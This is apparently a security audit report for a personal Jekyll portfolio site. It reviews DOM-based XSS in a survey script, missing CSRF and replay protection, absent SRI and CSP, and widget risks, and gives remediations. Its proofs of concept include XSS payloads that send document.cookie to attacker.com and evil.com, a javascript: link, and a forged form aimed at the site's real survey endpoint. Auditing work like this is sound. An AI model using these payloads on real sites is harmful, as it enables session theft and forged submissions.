# Security Audit Report — yourspraveen.github.io

**Date:** 2026-04-13
**Scope:** Full client-side security review of Jekyll site (Beautiful Jekyll 6.0.1)
**Platform:** GitHub Pages (static hosting, no custom HTTP headers)

---

## Executive Summary

The site is a static Jekyll portfolio with a complex survey subsystem, contact form (Formspree), and several third-party widget embeds. The primary attack surface is the **survey system** (`survey.js`, 1500+ lines), which has **critical DOM-based XSS vulnerabilities** via unsanitized `innerHTML` usage. The rest of the site is low-risk by nature of being static HTML.

| Severity | Count | Key Area |
|----------|-------|----------|
| CRITICAL | 3 | Survey JS: innerHTML with unsanitized markdown, config.json labels, question text |
| HIGH | 3 | Survey: no CSRF, no replay protection, localStorage tampering |
| MEDIUM | 6 | Missing SRI on CDNs, no CSP, document.write(), search library, widget embeds |
| LOW | 4 | Email injection (mitigated by Formspree), honeypot weakness, code enumeration |
| INFO | 3 | Public analytics token, social profile exposure, disabled comment systems |

---

## Finding 1 — CRITICAL: DOM-Based XSS in Survey MarkdownParser

**Files:** `assets/js/survey.js` lines 35-71, 387, 429
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**CVSS 3.1:** 8.5 (High)

**Description:** The `MarkdownParser.parse()` method converts markdown to HTML using regex replacements without escaping user content. The result is assigned directly to `container.innerHTML`. If an attacker can modify `intro.md` or `appendix.md` in any survey asset directory, arbitrary JavaScript executes in every visitor's browser.

**Proof of Concept:**
```markdown
# Welcome to Our Survey
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

**Affected code path:** `loadSurveyIntro()` -> `MarkdownParser.parse(markdown)` -> `container.innerHTML = html`

**Remediation:** Sanitize parsed HTML with DOMPurify before assigning to innerHTML, or use `textContent` where HTML rendering is not needed.

---

## Finding 2 — CRITICAL: DOM-Based XSS via config.json Question Rendering

**Files:** `assets/js/survey.js` lines 741, 817
**CWE:** CWE-79
**CVSS 3.1:** 8.5

**Description:** Survey question labels and text from `config.json` are rendered via `innerHTML` without sanitization:
- Line 741: `labelContent.innerHTML = row.label;`
- Line 817: `label.innerHTML = question.text + ...`

The `SecurityUtils.sanitizeText()` function exists (lines 79-106) but is **never called** during question rendering — only during submission payload construction.

**Proof of Concept (config.json):**
```json
{
  "questions": [{
    "text": "Rate your experience<script>document.location='https://evil.com/'+document.cookie</script>",
    "type": "likert"
  }]
}
```

**Remediation:** Call `SecurityUtils.sanitizeText()` on all config.json values before rendering, or switch to `textContent`.

---

## Finding 3 — CRITICAL: Unvalidated Markdown Link URLs (javascript: protocol)

**File:** `assets/js/survey.js` line 51
**CWE:** CWE-79

**Description:** The MarkdownParser converts `[text](url)` to `<a href="url">` without validating the URL protocol. `javascript:` URLs execute code.

**Proof of Concept:**
```markdown
[Click here for details](javascript:alert(document.domain))
```

**Remediation:** Validate that link URLs start with `https://` or `http://` only.

---

## Finding 4 — HIGH: No CSRF Protection on Survey Submission

**File:** `assets/js/survey.js` line 7 (Cloud Run endpoint)
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Description:** Survey responses POST to `https://survey-api-*.us-central1.run.app/submit-survey` with no CSRF token, no Origin header validation, and no SameSite cookie enforcement. An attacker can forge submissions from any domain.

**Proof of Concept:**
```html
<!-- On attacker.com -->
<form action="https://survey-api-365853907280.us-central1.run.app/submit-survey" method="POST">
  <input name="code" value="AIPM8">
  <input name="responses" value='{"q1":"attacker-controlled"}'>
  <button>Submit</button>
</form>
```

**Remediation:** Add server-side CSRF token generation and validation. Include Origin/Referer header checks on the Cloud Run API.

---

## Finding 5 — HIGH: No Replay Protection on Survey Submission

**File:** `assets/js/survey.js` lines 1289-1413
**CWE:** CWE-294 (Authentication Bypass by Capture-replay)

**Description:** Survey submissions include no nonce, timestamp, or one-time token. A captured HTTP request can be replayed indefinitely to inflate participation metrics or pollute data.

**Remediation:** Include a server-generated nonce with each survey session. Validate and expire nonces server-side.

---

## Finding 6 — HIGH: localStorage Survey State Tampering

**File:** `assets/js/survey.js` lines 1418-1450
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

**Description:** All survey responses are stored unencrypted in localStorage under `survey_state_{code}`. Any XSS on the page (including from Finding 1-3) can read, modify, or exfiltrate responses. Additionally, localStorage persists indefinitely, extending the attack window.

**Remediation:** If local state is needed, encrypt it with a session-derived key. Prefer server-side session state. Clear localStorage on survey completion.

---

## Finding 7 — MEDIUM: Missing Subresource Integrity (SRI) on CDN Resources

**Files:** `_layouts/base.html` line 16, `_includes/search.html` line 9

**Description:**
| Resource | SRI Status |
|----------|------------|
| Bootstrap CSS/JS | Has SRI |
| jQuery 3.5.1 | Has SRI |
| Popper.js 1.16 | Has SRI |
| FontAwesome 6.5.2 (cdnjs) | **Missing SRI** |
| simple-jekyll-search (unpkg) | **Missing SRI** |
| Google Fonts | N/A (dynamic CSS) |

If cdnjs.cloudflare.com or unpkg.com are compromised, malicious JavaScript executes with full page access.

**Remediation:** Add `integrity` and `crossorigin` attributes to FontAwesome and simple-jekyll-search script tags. Pin simple-jekyll-search to a specific version instead of `@latest`.

---

## Finding 8 — MEDIUM: No Content Security Policy

**File:** `_includes/head.html`
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Description:** No CSP meta tag exists. The site loads scripts from 6+ external origins with no policy restricting which origins can execute code. This amplifies the impact of any XSS finding.

**Remediation (meta tag, since GitHub Pages doesn't support custom headers):**
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://unpkg.com https://widgets.sociablekit.com https://koalendar.com https://static.cloudflareinsights.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com https://stackpath.bootstrapcdn.com;
  font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com;
  img-src * data:;
  connect-src 'self' https://survey-api-365853907280.us-central1.run.app;
  frame-src https://koalendar.com;
">
```

---

## Finding 9 — MEDIUM: document.write() in Footer Scripts

**File:** `_includes/footer-scripts.html` line 13

**Description:** jQuery conditional loading uses `document.write()` to inject a `<script>` tag. If called after the document is fully parsed, `document.write()` replaces the entire page.

**Remediation:** Replace with `document.createElement('script')` + `document.body.appendChild()`.

---

## Finding 10 — MEDIUM: Third-Party Widget Embeds Without Sandboxing

**Files:** `appointments.html` (Koalendar), `posts.html` (SociableKit)

**Description:** Both widgets load as inline JavaScript with full DOM access. Neither uses iframe sandboxing. If either service is compromised, the attacker gains full control of the page.

**Remediation:** Load widgets inside `<iframe sandbox="allow-scripts allow-same-origin">` where possible.

---

## Finding 11 — LOW: Survey Code Brute-Force Risk

**File:** `assets/js/survey.js` — code entry UI

**Description:** Survey codes are short alphanumeric strings. No rate limiting is visible on the client or (from what can be observed) the server. An attacker could enumerate valid codes.

**Remediation:** Add rate limiting on the Cloud Run API (e.g., 5 attempts/minute/IP). Consider longer codes or UUIDs.

---

## Finding 12 — LOW: Email Header Injection via Contact Form

**File:** `contact.html` line 18

**Description:** The `_replyto` field accepts user input. While Formspree's server-side validation likely prevents SMTP header injection (newline characters in email), no client-side validation beyond HTML5 `type="email"` exists.

**Remediation:** Formspree handles this server-side. Add client-side pattern validation as defense-in-depth.

---

## Components Verified as Safe

| Component | Status | Notes |
|-----------|--------|-------|
| beautifuljekyll.js | Safe | jQuery DOM methods only, no innerHTML |
| darkmode.js | Safe | setAttribute/localStorage only, try-catch wrapped |
| scroll-reveal.js | Safe | classList only, respects prefers-reduced-motion |
| staticman.js | Safe | addClass/removeClass only |
| Contact form (Formspree) | Safe | HTTPS, server-side validation, honeypot present |
| All comment systems | Safe | All disabled in _config.yml |
| Gem dependencies | Safe | Current versions, no known critical CVEs |
| _config.yml | Safe | No secrets; analytics token is public by design |

---

## Risk Matrix

```
                    LIKELIHOOD
               Low    Med    High
           +--------+------+------+
   High    |   8,9  |  7   | 1,2,3|  IMPACT
           +--------+------+------+
   Med     | 11,12  | 10   | 4,5,6|
           +--------+------+------+
   Low     |        |      |      |
           +--------+------+------+
```

---

## Backend Review Addendum (2026-04-13)

After reviewing the backend source at `/Users/praveenp/PycharmProjects/FormSupport/app.py`, several findings are **already mitigated server-side**:

| Finding | Original Severity | Revised | Backend Mitigation |
|---------|-------------------|---------|-------------------|
| F4: CSRF | HIGH | **LOW** | CORS whitelist in `app.py:36-40` allows only 3 origins (`yourspraveen.com`, `localhost:4000`, `127.0.0.1:4000`). JSON Content-Type requirement triggers CORS preflight, blocking cross-origin form POSTs. |
| F5: Replay | HIGH | **LOW** | Stateless email-only backend (no database). Replays create duplicate emails at worst. Rate limiting constrains volume. |
| F11: Brute-force | LOW | **RESOLVED** | `@limiter.limit("5/minute")` on `/submit-survey` endpoint (`app.py:274`). Uses slowapi with per-IP tracking. |

**Additional backend security controls discovered:**
- Security headers middleware (`app.py:48-60`): X-Content-Type-Options, X-Frame-Options, HSTS, CSP
- Pydantic input validation with HTML tag detection (`app.py:105-170`)
- Code field sanitization to alphanumeric only (`app.py:88-102`)
- Non-root Docker container with minimal base image
- Secrets managed via Google Cloud Secret Manager

---

## Remediation Priority (Revised)

1. **Immediate** — Fix innerHTML XSS in survey.js (Findings 1-3) + add DOMPurify
2. **Short-term** — Add CSP meta tag, SRI hashes (Findings 7-8)
3. **Low priority** — Replace document.write (Finding 9)
4. **Deferred** — Widget sandboxing (Finding 10) — may break functionality
5. **No action needed** — CSRF (F4), Replay (F5), Brute-force (F11) — mitigated by backend
6. **Ongoing** — Monitor gem versions, CDN integrity, third-party widget security
